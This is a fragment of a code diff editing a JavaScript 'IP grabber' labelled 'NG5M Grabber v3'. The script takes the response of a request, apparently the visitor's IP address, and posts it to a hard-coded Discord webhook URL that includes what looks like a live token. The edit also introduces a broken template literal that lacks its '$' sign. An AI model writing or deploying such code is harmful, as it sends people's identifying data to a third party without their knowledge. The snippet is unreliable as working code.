@@ -6,13 +6,12 @@ a.onreadystatechange = function () {
         var embed = {
             "author":"test",
             "title":"**Info**",
-            "description":"IP: "+this.responseText,
+            "description":`IP: {this.responseText}`,
         }
         
         const data = {
             "username":"NG5M Grabber v3",
-            "embeds":[ embed ],
-            "content":""
+            "content":"b"
         }
         fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"Content-type":"application/json"},"body":JSON.stringify(data));
     }
